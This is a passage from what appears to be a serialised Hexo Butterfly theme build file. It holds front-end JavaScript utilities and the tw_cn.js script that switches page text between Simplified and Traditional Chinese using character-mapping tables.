<div></div><div></div><div></div><div></div><div></div>\n          </div>\n        </div>\n      `\n        ele.insertAdjacentHTML('afterend', html)\n      },\n      remove: ele => {\n        ele.nextElementSibling.remove()\n      }\n    },\n\n    updateAnchor: anchor => {\n      if (anchor !== window.location.hash) {\n        if (!anchor) anchor = location.pathname\n        const title = GLOBAL_CONFIG_SITE.title\n        window.history.replaceState({\n          url: location.href,\n          title\n        }, title, anchor)\n      }\n    },\n\n    getScrollPercent: (() => {\n      let docHeight, winHeight, headerHeight, contentMath\n\n      return (currentTop, ele) => {\n        if (!docHeight || ele.clientHeight !== docHeight) {\n          docHeight = ele.clientHeight\n          winHeight = window.innerHeight\n          headerHeight = ele.offsetTop\n          contentMath = Math.max(docHeight - winHeight, document.documentElement.scrollHeight - winHeight)\n        }\n\n        const scrollPercent = (currentTop - headerHeight) / contentMath\n        return Math.max(0, Math.min(100, Math.round(scrollPercent * 100)))\n      }\n    })(),\n\n    addEventListenerPjax: (ele, event, fn, option = false) => {\n      ele.addEventListener(event, fn, option)\n      btf.addGlobalFn('pjaxSendOnce', () => {\n        ele.removeEventListener(event, fn, option)\n      })\n    },\n\n    removeGlobalFnEvent: (key, parent = window) => {\n      const globalFn = parent.globalFn || {}\n      const keyObj = globalFn[key]\n      if (!keyObj) return\n\n      Object.keys(keyObj).forEach(i => keyObj[i]())\n\n      delete globalFn[key]\n    },\n\n    switchComments: (el = document, path) => {\n      const switchBtn = el.querySelector('#switch-btn')\n      if (!switchBtn) return\n\n      let switchDone = false\n      const postComment = el.querySelector('#post-comment')\n      const handleSwitchBtn = () => {\n        postComment.classList.toggle('move')\n        if (!switchDone && typeof loadOtherComment === 'function') {\n          switchDone = true\n          loadOtherComment(el, path)\n        }\n      }\n      btf.addEventListenerPjax(switchBtn, 'click', handleSwitchBtn)\n    }\n  }\n\n  window.btf = { ...window.btf, ...btfFn }\n})()\n"},{"_content":"document.addEventListener('DOMContentLoaded', () => {\n  const { defaultEncoding, translateDelay, msgToTraditionalChinese, msgToSimplifiedChinese } = GLOBAL_CONFIG.translate\n  const snackbarData = GLOBAL_CONFIG.Snackbar\n  const targetEncodingCookie = 'translate-chn-cht'\n\n  let currentEncoding = defaultEncoding\n  let targetEncoding = Number(btf.saveToLocal.get(targetEncodingCookie)) || defaultEncoding\n  const translateButtonObject = document.getElementById('translateLink')\n  const isSnackbar = snackbarData !== undefined\n\n  const setLang = () => {\n    document.documentElement.lang = targetEncoding === 1 ? 'zh-TW' : 'zh-CN'\n  }\n\n  const translateText = (txt) => {\n    if (!txt) return ''\n    if (currentEncoding === 1 && targetEncoding === 2) return Simplized(txt)\n    if (currentEncoding === 2 && targetEncoding === 1) return Traditionalized(txt)\n    return txt\n  }\n\n  const translateBody = (fobj) => {\n    const nodes = typeof fobj === 'object' ? fobj.childNodes : document.body.childNodes\n\n    for (const node of nodes) {\n      // Skip BR, HR tags, or the translate button object\n      if (['BR', 'HR'].includes(node.tagName) || node === translateButtonObject) continue\n\n      if (node.nodeType === Node.ELEMENT_NODE) {\n        const { tagName, title, alt, placeholder, value, type } = node\n\n        // Translate title, alt, placeholder\n        if (title) node.title = translateText(title)\n        if (alt) node.alt = translateText(alt)\n        if (placeholder) node.placeholder = translateText(placeholder)\n\n        // Translate input value except text and hidden types\n        if (tagName === 'INPUT' && value && type !== 'text' && type !== 'hidden') {\n          node.value = translateText(value)\n        }\n\n        // Recursively translate child nodes\n        translateBody(node)\n      } else if (node.nodeType === Node.TEXT_NODE) {\n        // Translate text node data\n        node.data = translateText(node.data)\n      }\n    }\n  }\n\n  const translatePage = () => {\n    if (targetEncoding === 1) {\n      currentEncoding = 1\n      targetEncoding = 2\n      translateButtonObject.textContent = msgToTraditionalChinese\n      isSnackbar && btf.snackbarShow(snackbarData.cht_to_chs)\n    } else if (targetEncoding === 2) {\n      currentEncoding = 2\n      targetEncoding = 1\n      translateButtonObject.textContent = msgToSimplifiedChinese\n      isSnackbar && btf.snackbarShow(snackbarData.chs_to_cht)\n    }\n    btf.saveToLocal.set(targetEncodingCookie, targetEncoding, 2)\n    setLang()\n    translateBody()\n  }\n\n  const JTPYStr = () => '万与丑专业丛东丝丢两严丧个丬丰临为丽举么义乌乐乔习乡书买乱争于亏云亘亚产亩亲亵亸亿仅从仑仓仪们价众优伙会伛伞伟传伤伥伦伧伪伫体余佣佥侠侣侥侦侧侨侩侪侬俣俦俨俩俪俭债倾偬偻偾偿傥傧储傩儿兑兖党兰关兴兹养兽冁内冈册写军农冢冯冲决况冻净凄凉凌减凑凛几凤凫凭凯击凼凿刍划刘则刚创删别刬刭刽刿剀剂剐剑剥剧劝办务劢动励劲劳势勋勐勚匀匦匮区医华协单卖卢卤卧卫却卺厂厅历厉压厌厍厕厢厣厦厨厩厮县参叆叇双发变叙叠叶号叹叽吁后吓吕吗吣吨听启吴呒呓呕呖呗员呙呛呜咏咔咙咛咝咤咴咸哌响哑哒哓哔哕哗哙哜哝哟唛唝唠唡唢唣唤唿啧啬啭啮啰啴啸喷喽喾嗫呵嗳嘘嘤嘱噜噼嚣嚯团园囱围囵国图圆圣圹场坂坏块坚坛坜坝坞坟坠垄垅垆垒垦垧垩垫垭垯垱垲垴埘埙埚埝埯堑堕塆墙壮声壳壶壸处备复够头夸夹夺奁奂奋奖奥妆妇妈妩妪妫姗姜娄娅娆娇娈娱娲娴婳婴婵婶媪嫒嫔嫱嬷孙学孪宁宝实宠审宪宫宽宾寝对寻导寿将尔尘尧尴尸尽层屃屉届属屡屦屿岁岂岖岗岘岙岚岛岭岳岽岿峃峄峡峣峤峥峦崂崃崄崭嵘嵚嵛嵝嵴巅巩巯币帅师帏帐帘帜带帧帮帱帻帼幂幞干并广庄庆庐庑库应庙庞废庼廪开异弃张弥弪弯弹强归当录彟彦彻径徕御忆忏忧忾怀态怂怃怄怅怆怜总怼怿恋恳恶恸恹恺恻恼恽悦悫悬悭悯惊惧惨惩惫惬惭惮惯愍愠愤愦愿慑慭憷懑懒懔戆戋戏戗战戬户扎扑扦执扩扪扫扬扰抚抛抟抠抡抢护报担拟拢拣拥拦拧拨择挂挚挛挜挝挞挟挠挡挢挣挤挥挦捞损捡换捣据捻掳掴掷掸掺掼揸揽揿搀搁搂搅携摄摅摆摇摈摊撄撑撵撷撸撺擞攒敌敛数斋斓斗斩断无旧时旷旸昙昼昽显晋晒晓晔晕晖暂暧札术朴机杀杂权条来杨杩杰极构枞枢枣枥枧枨枪枫枭柜柠柽栀栅标栈栉栊栋栌栎栏树栖样栾桊桠桡桢档桤桥桦桧桨桩梦梼梾检棂椁椟椠椤椭楼榄榇榈榉槚槛槟槠横樯樱橥橱橹橼檐檩欢欤欧歼殁殇残殒殓殚殡殴毁毂毕毙毡毵氇气氢氩氲汇汉污汤汹沓沟没沣沤沥沦沧沨沩沪沵泞泪泶泷泸泺泻泼泽泾洁洒洼浃浅浆浇浈浉浊测浍济浏浐浑浒浓浔浕涂涌涛涝涞涟涠涡涢涣涤润涧涨涩淀渊渌渍渎渐渑渔渖渗温游湾湿溃溅溆溇滗滚滞滟滠满滢滤滥滦滨滩滪漤潆潇潋潍潜潴澜濑濒灏灭灯灵灾灿炀炉炖炜炝点炼炽烁烂烃烛烟烦烧烨烩烫烬热焕焖焘煅煳熘爱爷牍牦牵牺犊犟状犷犸犹狈狍狝狞独狭狮狯狰狱狲猃猎猕猡猪猫猬献獭玑玙玚玛玮环现玱玺珉珏珐珑珰珲琎琏琐琼瑶瑷璇璎瓒瓮瓯电画畅畲畴疖疗疟疠疡疬疮疯疱疴痈痉痒痖痨痪痫痴瘅瘆瘗瘘瘪瘫瘾瘿癞癣癫癯皑皱皲盏盐监盖盗盘眍眦眬着睁睐睑瞒瞩矫矶矾矿砀码砖砗砚砜砺砻砾础硁硅硕硖硗硙硚确硷碍碛碜碱碹磙礼祎祢祯祷祸禀禄禅离秃秆种积称秽秾稆税稣稳穑穷窃窍窑窜窝窥窦窭竖竞笃笋笔笕笺笼笾筑筚筛筜筝筹签简箓箦箧箨箩箪箫篑篓篮篱簖籁籴类籼粜粝粤粪粮糁糇紧絷纟纠纡红纣纤纥约级纨纩纪纫纬纭纮纯纰纱纲纳纴纵纶纷纸纹纺纻纼纽纾线绀绁绂练组绅细织终绉绊绋绌绍绎经绐绑绒结绔绕绖绗绘给绚绛络绝绞统绠绡绢绣绤绥绦继绨绩绪绫绬续绮绯绰绱绲绳维绵绶绷绸绹绺绻综绽绾绿缀缁缂缃缄缅缆缇缈缉缊缋缌缍缎缏缐缑缒缓缔缕编缗缘缙缚缛缜缝缞缟缠缡缢缣缤缥缦缧缨缩缪缫缬缭缮缯缰缱缲缳缴缵罂网罗罚罢罴羁羟羡翘翙翚耢耧耸耻聂聋职聍联聩聪肃肠肤肷肾肿胀胁胆胜胧胨胪胫胶脉脍脏脐脑脓脔脚脱脶脸腊腌腘腭腻腼腽腾膑臜舆舣舰舱舻艰艳艹艺节芈芗芜芦苁苇苈苋苌苍苎苏苘苹茎茏茑茔茕茧荆荐荙荚荛荜荞荟荠荡荣荤荥荦荧荨荩荪荫荬荭荮药莅莜莱莲莳莴莶获莸莹莺莼萚萝萤营萦萧萨葱蒇蒉蒋蒌蓝蓟蓠蓣蓥蓦蔷蔹蔺蔼蕲蕴薮藁藓虏虑虚虫虬虮虽虾虿蚀蚁蚂蚕蚝蚬蛊蛎蛏蛮蛰蛱蛲蛳蛴蜕蜗蜡蝇蝈蝉蝎蝼蝾螀螨蟏衅衔补衬衮袄袅袆袜袭袯装裆裈裢裣裤裥褛褴襁襕见观觃规觅视觇览觉觊觋觌觍觎觏觐觑觞触觯詟誉誊讠计订讣认讥讦讧讨让讪讫训议讯记讱讲讳讴讵讶讷许讹论讻讼讽设访诀证诂诃评诅识诇诈诉诊诋诌词诎诏诐译诒诓诔试诖诗诘诙诚诛诜话诞诟诠诡询诣诤该详诧诨诩诪诫诬语诮误诰诱诲诳说诵诶请诸诹诺读诼诽课诿谀谁谂调谄谅谆谇谈谊谋谌谍谎谏谐谑谒谓谔谕谖谗谘谙谚谛谜谝谞谟谠谡谢谣谤谥谦谧谨谩谪谫谬谭谮谯谰谱谲谳谴谵谶谷豮贝贞负贠贡财责贤败账货质贩贪贫贬购贮贯贰贱贲贳贴贵贶贷贸费贺贻贼贽贾贿赀赁赂赃资赅赆赇赈赉赊赋赌赍赎赏赐赑赒赓赔赕赖赗赘赙赚赛赜赝赞赟赠赡赢赣赪赵赶趋趱趸跃跄跖跞践跶跷跸跹跻踊踌踪踬踯蹑蹒蹰蹿躏躜躯车轧轨轩轪轫转轭轮软轰轱轲轳轴轵轶轷轸轹轺轻轼载轾轿辀辁辂较辄辅辆辇辈辉辊辋辌辍辎辏辐辑辒输辔辕辖辗辘辙辚辞辩辫边辽达迁过迈运还这进远违连迟迩迳迹适选逊递逦逻遗遥邓邝邬邮邹邺邻郁郄郏郐郑郓郦郧郸酝酦酱酽酾酿释里鉅鉴銮錾钆钇针钉钊钋钌钍钎钏钐钑钒钓钔钕钖钗钘钙钚钛钝钞钟钠钡钢钣钤钥钦钧钨钩钪钫钬钭钮钯钰钱钲钳钴钵钶钷钸钹钺钻钼钽钾钿铀铁铂铃铄铅铆铈铉铊铋铍铎铏铐铑铒铕铗铘铙铚铛铜铝铞铟铠铡铢铣铤铥铦铧铨铪铫铬铭铮铯铰铱铲铳铴铵银铷铸铹铺铻铼铽链铿销锁锂锃锄锅锆锇锈锉锊锋锌锍锎锏锐锑锒锓锔锕锖锗错锚锜锞锟锠锡锢锣锤锥锦锨锩锫锬锭键锯锰锱锲锳锴锵锶锷锸锹锺锻锼锽锾锿镀镁镂镃镆镇镈镉镊镌镍镎镏镐镑镒镕镖镗镙镚镛镜镝镞镟镠镡镢镣镤镥镦镧镨镩镪镫镬镭镮镯镰镱镲镳镴镶长门闩闪闫闬闭问闯闰闱闲闳间闵闶闷闸闹闺闻闼闽闾闿阀阁阂阃阄阅阆阇阈阉阊阋阌阍阎阏阐阑阒阓阔阕阖阗阘阙阚阛队阳阴阵阶际陆陇陈陉陕陧陨险随隐隶隽难雏雠雳雾霁霉霭靓静靥鞑鞒鞯鞴韦韧韨韩韪韫韬韵页顶顷顸项顺须顼顽顾顿颀颁颂颃预颅领颇颈颉颊颋颌颍颎颏颐频颒颓颔颕颖颗题颙颚颛颜额颞颟颠颡颢颣颤颥颦颧风飏飐飑飒飓飔飕飖飗飘飙飚飞飨餍饤饥饦饧饨饩饪饫饬饭饮饯饰饱饲饳饴饵饶饷饸饹饺饻饼饽饾饿馀馁馂馃馄馅馆馇馈馉馊馋馌馍馎馏馐馑馒馓馔馕马驭驮驯驰驱驲驳驴驵驶驷驸驹驺驻驼驽驾驿骀骁骂骃骄骅骆骇骈骉骊骋验骍骎骏骐骑骒骓骔骕骖骗骘骙骚骛骜骝骞骟骠骡骢骣骤骥骦骧髅髋髌鬓魇魉鱼鱽鱾鱿鲀鲁鲂鲄鲅鲆鲇鲈鲉鲊鲋鲌鲍鲎鲏鲐鲑鲒鲓鲔鲕鲖鲗鲘鲙鲚鲛鲜鲝鲞鲟鲠鲡鲢鲣鲤鲥鲦鲧鲨鲩鲪鲫鲬鲭鲮鲯鲰鲱鲲鲳鲴鲵鲶鲷鲸鲹鲺鲻鲼鲽鲾鲿鳀鳁鳂鳃鳄鳅鳆鳇鳈鳉鳊鳋鳌鳍鳎鳏鳐鳑鳒鳓鳔鳕鳖鳗鳘鳙鳛鳜鳝鳞鳟鳠鳡鳢鳣鸟鸠鸡鸢鸣鸤鸥鸦鸧鸨鸩鸪鸫鸬鸭鸮鸯鸰鸱鸲鸳鸴鸵鸶鸷鸸鸹鸺鸻鸼鸽鸾鸿鹀鹁鹂鹃鹄鹅鹆鹇鹈鹉鹊鹋鹌鹍鹎鹏鹐鹑鹒鹓鹔鹕鹖鹗鹘鹚鹛鹜鹝鹞鹟鹠鹡鹢鹣鹤鹥鹦鹧鹨鹩鹪鹫鹬鹭鹯鹰鹱鹲鹳鹴鹾麦麸黄黉黡黩黪黾龙历志制一台皋准复猛钟注范签'\n  const FTPYStr = () => '萬與醜專業叢東絲丟兩嚴喪個爿豐臨為麗舉麼義烏樂喬習鄉書買亂爭於虧雲亙亞產畝親褻嚲億僅從侖倉儀們價眾優夥會傴傘偉傳傷倀倫傖偽佇體餘傭僉俠侶僥偵側僑儈儕儂俁儔儼倆儷儉債傾傯僂僨償儻儐儲儺兒兌兗黨蘭關興茲養獸囅內岡冊寫軍農塚馮衝決況凍淨淒涼淩減湊凜幾鳳鳧憑凱擊氹鑿芻劃劉則剛創刪別剗剄劊劌剴劑剮劍剝劇勸辦務勱動勵勁勞勢勳猛勩勻匭匱區醫華協單賣盧鹵臥衛卻巹廠廳曆厲壓厭厙廁廂厴廈廚廄廝縣參靉靆雙發變敘疊葉號歎嘰籲後嚇呂嗎唚噸聽啟吳嘸囈嘔嚦唄員咼嗆嗚詠哢嚨嚀噝吒噅鹹呱響啞噠嘵嗶噦嘩噲嚌噥喲嘜嗊嘮啢嗩唕喚呼嘖嗇囀齧囉嘽嘯噴嘍嚳囁嗬噯噓嚶囑嚕劈囂謔團園囪圍圇國圖圓聖壙場阪壞塊堅壇壢壩塢墳墜壟壟壚壘墾坰堊墊埡墶壋塏堖塒塤堝墊垵塹墮壪牆壯聲殼壺壼處備複夠頭誇夾奪奩奐奮獎奧妝婦媽嫵嫗媯姍薑婁婭嬈嬌孌娛媧嫻嫿嬰嬋嬸媼嬡嬪嬙嬤孫學孿寧寶實寵審憲宮寬賓寢對尋導壽將爾塵堯尷屍盡層屭屜屆屬屢屨嶼歲豈嶇崗峴嶴嵐島嶺嶽崠巋嶨嶧峽嶢嶠崢巒嶗崍嶮嶄嶸嶔崳嶁脊巔鞏巰幣帥師幃帳簾幟帶幀幫幬幘幗冪襆幹並廣莊慶廬廡庫應廟龐廢廎廩開異棄張彌弳彎彈強歸當錄彠彥徹徑徠禦憶懺憂愾懷態慫憮慪悵愴憐總懟懌戀懇惡慟懨愷惻惱惲悅愨懸慳憫驚懼慘懲憊愜慚憚慣湣慍憤憒願懾憖怵懣懶懍戇戔戲戧戰戩戶紮撲扡執擴捫掃揚擾撫拋摶摳掄搶護報擔擬攏揀擁攔擰撥擇掛摯攣掗撾撻挾撓擋撟掙擠揮撏撈損撿換搗據撚擄摑擲撣摻摜摣攬撳攙擱摟攪攜攝攄擺搖擯攤攖撐攆擷擼攛擻攢敵斂數齋斕鬥斬斷無舊時曠暘曇晝曨顯晉曬曉曄暈暉暫曖劄術樸機殺雜權條來楊榪傑極構樅樞棗櫪梘棖槍楓梟櫃檸檉梔柵標棧櫛櫳棟櫨櫟欄樹棲樣欒棬椏橈楨檔榿橋樺檜槳樁夢檮棶檢欞槨櫝槧欏橢樓欖櫬櫚櫸檟檻檳櫧橫檣櫻櫫櫥櫓櫞簷檁歡歟歐殲歿殤殘殞殮殫殯毆毀轂畢斃氈毿氌氣氫氬氳彙漢汙湯洶遝溝沒灃漚瀝淪滄渢溈滬濔濘淚澩瀧瀘濼瀉潑澤涇潔灑窪浹淺漿澆湞溮濁測澮濟瀏滻渾滸濃潯濜塗湧濤澇淶漣潿渦溳渙滌潤澗漲澀澱淵淥漬瀆漸澠漁瀋滲溫遊灣濕潰濺漵漊潷滾滯灩灄滿瀅濾濫灤濱灘澦濫瀠瀟瀲濰潛瀦瀾瀨瀕灝滅燈靈災燦煬爐燉煒熗點煉熾爍爛烴燭煙煩燒燁燴燙燼熱煥燜燾煆糊溜愛爺牘犛牽犧犢強狀獷獁猶狽麅獮獰獨狹獅獪猙獄猻獫獵獼玀豬貓蝟獻獺璣璵瑒瑪瑋環現瑲璽瑉玨琺瓏璫琿璡璉瑣瓊瑤璦璿瓔瓚甕甌電畫暢佘疇癤療瘧癘瘍鬁瘡瘋皰屙癰痙癢瘂癆瘓癇癡癉瘮瘞瘺癟癱癮癭癩癬癲臒皚皺皸盞鹽監蓋盜盤瞘眥矓著睜睞瞼瞞矚矯磯礬礦碭碼磚硨硯碸礪礱礫礎硜矽碩硤磽磑礄確鹼礙磧磣堿镟滾禮禕禰禎禱禍稟祿禪離禿稈種積稱穢穠穭稅穌穩穡窮竊竅窯竄窩窺竇窶豎競篤筍筆筧箋籠籩築篳篩簹箏籌簽簡籙簀篋籜籮簞簫簣簍籃籬籪籟糴類秈糶糲粵糞糧糝餱緊縶糸糾紆紅紂纖紇約級紈纊紀紉緯紜紘純紕紗綱納紝縱綸紛紙紋紡紵紖紐紓線紺絏紱練組紳細織終縐絆紼絀紹繹經紿綁絨結絝繞絰絎繪給絢絳絡絕絞統綆綃絹繡綌綏絛繼綈績緒綾緓續綺緋綽緔緄繩維綿綬繃綢綯綹綣綜綻綰綠綴緇緙緗緘緬纜緹緲緝縕繢緦綞緞緶線緱縋緩締縷編緡緣縉縛縟縝縫縗縞纏縭縊縑繽縹縵縲纓縮繆繅纈繚繕繒韁繾繰繯繳纘罌網羅罰罷羆羈羥羨翹翽翬耮耬聳恥聶聾職聹聯聵聰肅腸膚膁腎腫脹脅膽勝朧腖臚脛膠脈膾髒臍腦膿臠腳脫腡臉臘醃膕齶膩靦膃騰臏臢輿艤艦艙艫艱豔艸藝節羋薌蕪蘆蓯葦藶莧萇蒼苧蘇檾蘋莖蘢蔦塋煢繭荊薦薘莢蕘蓽蕎薈薺蕩榮葷滎犖熒蕁藎蓀蔭蕒葒葤藥蒞蓧萊蓮蒔萵薟獲蕕瑩鶯蓴蘀蘿螢營縈蕭薩蔥蕆蕢蔣蔞藍薊蘺蕷鎣驀薔蘞藺藹蘄蘊藪槁蘚虜慮虛蟲虯蟣雖蝦蠆蝕蟻螞蠶蠔蜆蠱蠣蟶蠻蟄蛺蟯螄蠐蛻蝸蠟蠅蟈蟬蠍螻蠑螿蟎蠨釁銜補襯袞襖嫋褘襪襲襏裝襠褌褳襝褲襇褸襤繈襴見觀覎規覓視覘覽覺覬覡覿覥覦覯覲覷觴觸觶讋譽謄訁計訂訃認譏訐訌討讓訕訖訓議訊記訒講諱謳詎訝訥許訛論訩訟諷設訪訣證詁訶評詛識詗詐訴診詆謅詞詘詔詖譯詒誆誄試詿詩詰詼誠誅詵話誕詬詮詭詢詣諍該詳詫諢詡譸誡誣語誚誤誥誘誨誑說誦誒請諸諏諾讀諑誹課諉諛誰諗調諂諒諄誶談誼謀諶諜謊諫諧謔謁謂諤諭諼讒諮諳諺諦謎諞諝謨讜謖謝謠謗諡謙謐謹謾謫譾謬譚譖譙讕譜譎讞譴譫讖穀豶貝貞負貟貢財責賢敗賬貨質販貪貧貶購貯貫貳賤賁貰貼貴貺貸貿費賀貽賊贄賈賄貲賃賂贓資賅贐賕賑賚賒賦賭齎贖賞賜贔賙賡賠賧賴賵贅賻賺賽賾贗讚贇贈贍贏贛赬趙趕趨趲躉躍蹌蹠躒踐躂蹺蹕躚躋踴躊蹤躓躑躡蹣躕躥躪躦軀車軋軌軒軑軔轉軛輪軟轟軲軻轤軸軹軼軤軫轢軺輕軾載輊轎輈輇輅較輒輔輛輦輩輝輥輞輬輟輜輳輻輯轀輸轡轅轄輾轆轍轔辭辯辮邊遼達遷過邁運還這進遠違連遲邇逕跡適選遜遞邐邏遺遙鄧鄺鄔郵鄒鄴鄰鬱郤郟鄶鄭鄆酈鄖鄲醞醱醬釅釃釀釋裏钜鑒鑾鏨釓釔針釘釗釙釕釷釺釧釤鈒釩釣鍆釹鍚釵鈃鈣鈈鈦鈍鈔鍾鈉鋇鋼鈑鈐鑰欽鈞鎢鉤鈧鈁鈥鈄鈕鈀鈺錢鉦鉗鈷缽鈳鉕鈽鈸鉞鑽鉬鉭鉀鈿鈾鐵鉑鈴鑠鉛鉚鈰鉉鉈鉍鈹鐸鉶銬銠鉺銪鋏鋣鐃銍鐺銅鋁銱銦鎧鍘銖銑鋌銩銛鏵銓鉿銚鉻銘錚銫鉸銥鏟銃鐋銨銀銣鑄鐒鋪鋙錸鋱鏈鏗銷鎖鋰鋥鋤鍋鋯鋨鏽銼鋝鋒鋅鋶鐦鐧銳銻鋃鋟鋦錒錆鍺錯錨錡錁錕錩錫錮鑼錘錐錦鍁錈錇錟錠鍵鋸錳錙鍥鍈鍇鏘鍶鍔鍤鍬鍾鍛鎪鍠鍰鎄鍍鎂鏤鎡鏌鎮鎛鎘鑷鐫鎳鎿鎦鎬鎊鎰鎔鏢鏜鏍鏰鏞鏡鏑鏃鏇鏐鐔钁鐐鏷鑥鐓鑭鐠鑹鏹鐙鑊鐳鐶鐲鐮鐿鑔鑣鑞鑲長門閂閃閆閈閉問闖閏闈閑閎間閔閌悶閘鬧閨聞闥閩閭闓閥閣閡閫鬮閱閬闍閾閹閶鬩閿閽閻閼闡闌闃闠闊闋闔闐闒闕闞闤隊陽陰陣階際陸隴陳陘陝隉隕險隨隱隸雋難雛讎靂霧霽黴靄靚靜靨韃鞽韉韝韋韌韍韓韙韞韜韻頁頂頃頇項順須頊頑顧頓頎頒頌頏預顱領頗頸頡頰頲頜潁熲頦頤頻頮頹頷頴穎顆題顒顎顓顏額顳顢顛顙顥纇顫顬顰顴風颺颭颮颯颶颸颼颻飀飄飆飆飛饗饜飣饑飥餳飩餼飪飫飭飯飲餞飾飽飼飿飴餌饒餉餄餎餃餏餅餑餖餓餘餒餕餜餛餡館餷饋餶餿饞饁饃餺餾饈饉饅饊饌饢馬馭馱馴馳驅馹駁驢駔駛駟駙駒騶駐駝駑駕驛駘驍罵駰驕驊駱駭駢驫驪騁驗騂駸駿騏騎騍騅騌驌驂騙騭騤騷騖驁騮騫騸驃騾驄驏驟驥驦驤髏髖髕鬢魘魎魚魛魢魷魨魯魴魺鮁鮃鯰鱸鮋鮓鮒鮊鮑鱟鮍鮐鮭鮚鮳鮪鮞鮦鰂鮜鱠鱭鮫鮮鮺鯗鱘鯁鱺鰱鰹鯉鰣鰷鯀鯊鯇鮶鯽鯒鯖鯪鯕鯫鯡鯤鯧鯝鯢鯰鯛鯨鯵鯴鯔鱝鰈鰏鱨鯷鰮鰃鰓鱷鰍鰒鰉鰁鱂鯿鰠鼇鰭鰨鰥鰩鰟鰜鰳鰾鱈鱉鰻鰵鱅鰼鱖鱔鱗鱒鱯鱤鱧鱣鳥鳩雞鳶鳴鳲鷗鴉鶬鴇鴆鴣鶇鸕鴨鴞鴦鴒鴟鴝鴛鴬鴕鷥鷙鴯鴰鵂鴴鵃鴿鸞鴻鵐鵓鸝鵑鵠鵝鵒鷳鵜鵡鵲鶓鵪鶤鵯鵬鵮鶉鶊鵷鷫鶘鶡鶚鶻鶿鶥鶩鷊鷂鶲鶹鶺鷁鶼鶴鷖鸚鷓鷚鷯鷦鷲鷸鷺鸇鷹鸌鸏鸛鸘鹺麥麩黃黌黶黷黲黽龍歷誌製壹臺臯準復勐鐘註範籤'\n\n  const Traditionalized = (cc) => {\n    let str = ''\n    const ss = JTPYStr()\n    const tt = FTPYStr()\n    for (let i = 0; i < cc.length; i++) {\n      if (cc.charCodeAt(i) > 10000 && ss.indexOf(cc.charAt(i)) !== -1) {\n        str += tt.charAt(ss.indexOf(cc.charAt(i)))\n      } else str += cc.charAt(i)\n    }\n    return str\n  }\n\n  const Simplized = (cc) => {\n    let str = ''\n    const ss = JTPYStr()\n    const tt = FTPYStr()\n    for (let i = 0; i < cc.length; i++) {\n      if (cc.charCodeAt(i) > 10000 && tt.indexOf(cc.charAt(i)) !== -1) {\n        str += ss.charAt(tt.indexOf(cc.charAt(i)))\n      } else str += cc.charAt(i)\n    }\n    return str\n  }\n\n  const translateInitialization = () => {\n    if (translateButtonObject) {\n      if (currentEncoding !== targetEncoding) {\n        translateButtonObject.textContent =\n          targetEncoding === 1\n            ? msgToSimplifiedChinese\n            : msgToTraditionalChinese\n        setLang()\n        setTimeout(translateBody, translateDelay)\n      }\n    }\n  }\n\n  window.translateFn = {\n    translatePage,\n    Traditionalized,\n    Simplized,\n    translateInitialization\n  }\n\n  translateInitialization()\n  btf.addGlobalFn('pjaxComplete', translateInitialization, 'translateInitialization')\n})\n","source":"js/tw_cn.js","raw":"document.addEventListener('DOMContentLoaded', () => {\n  const { defaultEncoding, translateDelay, msgToTraditionalChinese, msgToSimplifiedChinese } = GLOBAL_CONFIG.translate\n  const snackbarData = GLOBAL_CONFIG.Snackbar\n  const targetEncodingCookie = 'translate-chn-cht'\n\n  let currentEncoding = defaultEncoding\n  let targetEncoding = Number(btf.saveToLocal.get(targetEncodingCookie)) || defaultEncoding\n  const translateButtonObject = document.getElementById('translateLink')\n  const isSnackbar = snackbarData !== undefined\n\n  const setLang = () => {\n    document.documentElement.lang = targetEncoding === 1 ? 'zh-TW' : 'zh-CN'\n  }\n\n  const translateText = (txt) => {\n    if (!txt) return ''\n    if (currentEncoding === 1 && targetEncoding === 2) return Simplized(txt)\n    if (currentEncoding === 2 && targetEncoding === 1) return Traditionalized(txt)\n    return txt\n  }\n\n  const translateBody = (fobj) => {\n    const nodes = typeof fobj === 'object' ? fobj.childNodes : document.body.childNodes\n\n    for (const node of nodes) {\n      // Skip BR, HR tags, or the translate button object\n      if (['BR', 'HR'].includes(node.tagName) || node === translateButtonObject) continue\n\n      if (node.nodeType === Node.ELEMENT_NODE) {\n        const { tagName, title, alt, placeholder, value, type } = node\n\n        // Translate title, alt, placeholder\n        if (title) node.title = translateText(title)\n        if (alt) node.alt = translateText(alt)\n        if (placeholder) node.placeholder = translateText(placeholder)\n\n        // Translate input value except text and hidden types\n        if (tagName === 'INPUT' && value && type !== 'text' && type !== 'hidden') {\n          node.value = translateText(value)\n        }\n\n        // Recursively translate child nodes\n        translateBody(node)\n      } else if (node.nodeType === Node.TEXT_NODE) {\n        // Translate text node data\n        node.data = translateText(node.data)\n      }\n    }\n  }\n\n  const translatePage = () => {\n    if (targetEncoding === 1) {\n      currentEncoding = 1\n      targetEncoding = 2\n      translateButtonObject.textContent = msgToTraditionalChinese\n      isSnackbar && btf.snackbarShow(snackbarData.cht_to_chs)\n    } else if (targetEncoding === 2) {\n      currentEncoding = 2\n      targetEncoding = 1\n      translateButtonObject.textContent = msgToSimplifiedChinese\n      isSnackbar && btf.snackbarShow(snackbarData.chs_to_cht)\n    }\n    btf.saveToLocal.set(targetEncodingCookie, targetEncoding, 2)\n    setLang()\n    translateBody()\n  }\n\n  const JTPYStr = () => 